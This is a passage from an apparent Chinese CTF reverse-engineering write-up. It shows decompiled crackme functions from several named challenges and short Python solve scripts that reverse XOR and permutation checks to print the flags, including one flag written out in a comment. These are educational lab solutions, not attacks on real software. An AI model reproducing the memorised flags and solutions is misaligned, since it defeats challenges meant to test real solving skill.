class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">32</span>; ++i )<br>  &#123;<br>    byte_414040[i] = Str[dword_40F040[i]];<br>    byte_414040[i] ^= LOBYTE(dword_40F040[i]);<br>  &#125;<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">32</span>; ++j )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( byte_40F0E0[j] != byte_414040[j] )<br>    &#123;<br>      sub_40E640(<span class="hljs-string">&quot;Wrong!\n&quot;</span>);<br>      system(<span class="hljs-string">&quot;pause&quot;</span>);<br>      exit(<span class="hljs-number">0</span>);<br>    &#125;<br>  &#125;<br>  sub_40E640(<span class="hljs-string">&quot;Right!Good Job!\n&quot;</span>);<br>  sub_40E640(<span class="hljs-string">&quot;Here is your flag: %s\n&quot;</span>, Str);<br>  system(<span class="hljs-string">&quot;pause&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 根据key来排序ans</span><br>code = [<span class="hljs-number">0x67</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>]<br>key = [<span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x0000000A</span>, <span class="hljs-number">0x0000000F</span>, <span class="hljs-number">0x00000017</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000018</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000010</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x00000020</span>, <span class="hljs-number">0x0000001D</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0x0000001E</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0x00000016</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x00000013</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000019</span>, <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x0000001F</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000012</span>, <span class="hljs-number">0x0000001A</span>, <span class="hljs-number">0x0000001C</span>, <span class="hljs-number">0x0000000E</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>):<br>    code[i] ^= key[i]<br>ans = [<span class="hljs-number">0</span>] * <span class="hljs-number">33</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>):<br>    ans[key[i]] = code[i]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(ans))<br><br><span class="hljs-comment">#-------------------------------------------------------------------</span><br>code = [<span class="hljs-number">0x67</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>]<br>key = [<span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x0000000A</span>, <span class="hljs-number">0x0000000F</span>, <span class="hljs-number">0x00000017</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000018</span>, <span class="hljs-number">0x0000000C</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x00000010</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000011</span>, <span class="hljs-number">0x00000020</span>, <span class="hljs-number">0x0000001D</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0x0000001E</span>, <span class="hljs-number">0x0000001B</span>, <span class="hljs-number">0x00000016</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x0000000D</span>, <span class="hljs-number">0x00000013</span>, <span class="hljs-number">0x00000014</span>, <span class="hljs-number">0x00000015</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x00000019</span>, <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x0000001F</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000012</span>, <span class="hljs-number">0x0000001A</span>, <span class="hljs-number">0x0000001C</span>, <span class="hljs-number">0x0000000E</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000000</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>):<br>    code[i] ^= key[i]<br>ans = [c <span class="hljs-keyword">for</span> k,c <span class="hljs-keyword">in</span> <span class="hljs-built_in">sorted</span>(<span class="hljs-built_in">zip</span>(key,code))]<br><span class="hljs-comment"># 等价于</span><br><span class="hljs-comment"># ans = [k ^ c for k,c in sorted(zip(key,code))]</span><br><span class="hljs-comment">## zip打包成字典</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(ans))<br></code></pre></td></tr></table></figure><h1 id="2019红帽杯-easyRE"><a href="#2019红帽杯-easyRE" class="headerlink" title="[2019红帽杯]easyRE"></a>[2019红帽杯]easyRE</h1><blockquote><p>考点</p><ul><li>xor</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs python">__int64 sub_4009C6()<br>&#123;<br>  __int64 result; // rax<br>  <span class="hljs-built_in">int</span> i; // [rsp+Ch] [rbp-114h]<br>  __int64 v2; // [rsp+10h] [rbp-<span class="hljs-number">1</span>10h]<br>  __int64 v3; // [rsp+18h] [rbp-108h]<br>  __int64 v4; // [rsp+20h] [rbp-100h]<br>  __int64 v5; // [rsp+28h] [rbp-F8h]<br>  __int64 v6; // [rsp+30h] [rbp-F0h]<br>  __int64 v7; // [rsp+38h] [rbp-E8h]<br>  __int64 v8; // [rsp+40h] [rbp-E0h]<br>  __int64 v9; // [rsp+48h] [rbp-D8h]<br>  __int64 v10; // [rsp+50h] [rbp-D0h]<br>  __int64 v11; // [rsp+58h] [rbp-C8h]<br>  _BYTE Iodl_Qnb(ocy[<span class="hljs-number">13</span>]; // [rsp+60h] [rbp-C0h] BYREF<br>  char y.i_x7Fd_3w_wek9_iy__yL@EC[<span class="hljs-number">23</span>]; // [rsp+6Dh] [rbp-B3h] BYREF<br>  char buf[<span class="hljs-number">32</span>]; // [rsp+90h] [rbp-90h] BYREF<br>  <span class="hljs-built_in">int</span> v15; // [rsp+B0h] [rbp-70h]<br>  char v16; // [rsp+B4h] [rbp-6Ch]<br>  char buf_1[<span class="hljs-number">72</span>]; // [rsp+C0h] [rbp-60h] BYREF<br>  unsigned __int64 v18; // [rsp+108h] [rbp-18h]<br><br>  v18 = __readfsqword(0x28u);<br>  qmemcpy(Iodl_Qnb(ocy, <span class="hljs-string">&quot;Iodl&gt;Qnb(ocy&quot;</span>, <span class="hljs-number">12</span>);<br>  Iodl_Qnb(ocy[<span class="hljs-number">12</span>] = <span class="hljs-number">127</span>;<br>  qmemcpy(y.i_x7Fd_3w_wek9_iy__yL@EC, <span class="hljs-string">&quot;y.i\x7Fd`3w&#125;wek9&#123;iy=~yL@EC&quot;</span>, sizeof(y.i_x7Fd_3w_wek9_iy__yL@EC));<br>  memset(buf, <span class="hljs-number">0</span>, sizeof(buf));<br>  v15 = <span class="hljs-number">0</span>;<br>  v16 = <span class="hljs-number">0</span>;<br>  sub_4406E0(<span class="hljs-number">0</span>, buf, 0x25uLL);<br>  v16 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( ((__int64 (__fastcall *)(char *))strlen)(buf) == <span class="hljs-number">0x24</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; (unsigned __int64)((__int64 (__fastcall *)(char *))strlen)(buf); ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( (unsigned __int8)(buf[i] ^ i) != (char)Iodl_Qnb(ocy[i] )<br>      &#123;<br>        result = 4294967294LL;<br>        goto LABEL_13;<br>      &#125;<br>    &#125;<br>    sub_410CC0(<span class="hljs-string">&quot;continue!&quot;</span>);<br>    memset(buf_1, <span class="hljs-number">0</span>, <span class="hljs-number">65</span>);<br>    sub_4406E0(<span class="hljs-number">0</span>, buf_1, 0x40uLL);<br>    buf_1[<span class="hljs-number">39</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( ((__int64 (__fastcall *)(char *))strlen)(buf_1) == <span class="hljs-number">39</span> )<br>    &#123;<br>      v2 = base((const __m128i *)buf_1);<br>      v3 = base((const __m128i *)v2);<br>      v4 = base((const __m128i *)v3);<br>      v5 = base((const __m128i *)v4);<br>      v6 = base((const __m128i *)v5);<br>      v7 = base((const __m128i *)v6);<br>      v8 = base((const __m128i *)v7);<br>      v9 = base((const __m128i *)v8);<br>      v10 = base((const __m128i *)v9);<br>      v11 = base((const __m128i *)v10);<br>      <span class="hljs-keyword">if</span> ( !(unsigned <span class="hljs-built_in">int</span>)sub_400360(v11, (__int64)off_6CC090) )// <span class="hljs-string">&quot;Vm0wd2VHUXhTWGhpUm1SWVYwZDRWVll3Wkc5WFJsbDNXa1pPVlUxV2NIcFhhMk0xVmpKS1NHVkdXbFpOYmtKVVZtcEtTMUl5VGtsaVJtUk9ZV3hhZVZadGVHdFRNVTVYVW01T2FGSnRVbGhhVjNoaFZWWmtWMXBFVWxSTmJFcElWbTAxVDJGV1NuTlhia0pXWWxob1dGUnJXbXRXTVZaeVdrWm9hVlpyV1hwV1IzaGhXVmRHVjFOdVVsWmlhMHBZV1ZSR1lWZEdVbFZTYlhSWFRWWndNRlZ0TVc5VWJGcFZWbXR3VjJKSFVYZFdha1pXWlZaT2NtRkhhRk5pVjJoWVYxZDBhMVV3TlhOalJscFlZbGhTY1ZsclduZGxiR1J5VmxSR1ZXSlZjRWhaTUZKaFZqSktWVkZZYUZkV1JWcFlWV3BHYTFkWFRrZFRiV3hvVFVoQ1dsWXhaRFJpTWtsM1RVaG9hbEpYYUhOVmJUVkRZekZhY1ZKcmRGTk5Wa3A2VjJ0U1ExWlhTbFpqUldoYVRVWndkbFpxUmtwbGJVWklZVVprYUdFeGNHOVhXSEJIWkRGS2RGSnJhR2hTYXpWdlZGVm9RMlJzV25STldHUlZUVlpXTlZadE5VOVdiVXBJVld4c1dtSllUWGhXTUZwell6RmFkRkpzVWxOaVNFSktWa1phVTFFeFduUlRhMlJxVWxad1YxWnRlRXRXTVZaSFVsUnNVVlZVTURrPQ==&quot;</span><br>      &#123;<br>        sub_410CC0(<span class="hljs-string">&quot;You found me!!!&quot;</span>);<br>        sub_410CC0(<span class="hljs-string">&quot;bye bye~&quot;</span>);<br>      &#125;<br>      result = 0LL;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      result = 4294967293LL;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    result = 0xFFFFFFFFLL;<br>  &#125;<br>LABEL_13:<br>  <span class="hljs-keyword">if</span> ( __readfsqword(0x28u) != v18 )<br>    sub_444020();<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br>unsigned __int64 sub_400D35()<br>&#123;<br>  unsigned __int64 result; // rax<br>  unsigned <span class="hljs-built_in">int</span> v1; // [rsp+Ch] [rbp-24h]<br>  <span class="hljs-built_in">int</span> i; // [rsp+10h] [rbp-20h]<br>  <span class="hljs-built_in">int</span> j; // [rsp+14h] [rbp-1Ch]<br>  unsigned <span class="hljs-built_in">int</span> v4; // [rsp+24h] [rbp-Ch]<br>  unsigned __int64 v5; // [rsp+28h] [rbp-8h]<br><br>  v5 = __readfsqword(0x28u);<br>  v1 = sub_43FD20(0LL) - qword_6CEE38;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">1233</span>; ++i )<br>  &#123;<br>    sub_40F790(v1);<br>    sub_40FE60();<br>    sub_40FE60();<br>    v1 = sub_40FE60() ^ <span class="hljs-number">0x98765432</span>;<br>  &#125;<br>  v4 = v1;<br>  <span class="hljs-keyword">if</span> ( ((unsigned __int8)v1 ^ unk_6CC0A0[<span class="hljs-number">0</span>]) == <span class="hljs-string">&#x27;f&#x27;</span> &amp;&amp; (HIBYTE(v4) ^ unk_6CC0A3) == <span class="hljs-string">&#x27;g&#x27;</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">24</span>; ++j )<br>      sub_410E90((unsigned __int8)(unk_6CC0A0[j] ^ *((_BYTE *)&amp;v4 + j % <span class="hljs-number">4</span>)));<br>  &#125;<br>  result = __readfsqword(0x28u) ^ v5;<br>  <span class="hljs-keyword">if</span> ( result )<br>    sub_444020();<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 真正的密文数据和base64密文数据相邻，通过交叉引用可以找到加密流程</span><br><span class="hljs-comment">## 程序也给出了提示flag头起步</span><br>tips = [<span class="hljs-number">0x49</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x3e</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0x7f</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0x2e</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x7f</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0x7d</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x6b</span>,<span class="hljs-number">0x39</span>,<span class="hljs-number">0x7b</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0x3d</span>,<span class="hljs-number">0x7e</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0x4c</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x43</span>,]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(tips)):<br>    tips[i] ^= i<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(tips))<br><br>code = [<span class="hljs-number">0x40</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x5B</span>]<br>key = [<span class="hljs-number">38</span>,<span class="hljs-number">89</span>,<span class="hljs-number">65</span>,<span class="hljs-number">49</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(code)):<br>    code[i] ^= key[i%<span class="hljs-built_in">len</span>(key)]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(code))<br><span class="hljs-comment"># flag&#123;Act1ve_Defen5e_Test&#125;</span><br></code></pre></td></tr></table></figure><h1 id="MRCTF2020-Xor"><a href="#MRCTF2020-Xor" class="headerlink" title="[MRCTF2020]Xor"></a>[MRCTF2020]Xor</h1><blockquote><p>考点</p><ul><li>xor</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  unsigned <span class="hljs-built_in">int</span> i; // eax<br><br>  sub_401020((<span class="hljs-built_in">int</span>)<span class="hljs-string">&quot;Give Me Your Flag String:\n&quot;</span>);<br>  sub_401050(<span class="hljs-string">&quot;%s&quot;</span>, byte_4212C0);<br>  <span class="hljs-keyword">if</span> ( strlen(byte_4212C0) != <span class="hljs-number">27</span> )<br>  &#123;<br>LABEL_6:<br>    sub_401020((<span class="hljs-built_in">int</span>)<span class="hljs-string">&quot;Wrong!\n&quot;</span>);<br>    sub_404B7E(<span class="hljs-string">&quot;pause&quot;</span>);<br>    _loaddll(<span class="hljs-number">0</span>);<br>    __debugbreak();<br>  &#125;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x1B</span>; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( ((unsigned __int8)i ^ (unsigned __int8)byte_4212C0[i]) != byte_41EA08[i] )<br>      goto LABEL_6;<br>  &#125;<br>  sub_401020((<span class="hljs-built_in">int</span>)<span class="hljs-string">&quot;Right!\n&quot;</span>);<br>  sub_404B7E(<span class="hljs-string">&quot;pause&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>code = [<span class="hljs-number">0x4D</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x38</span>, <span 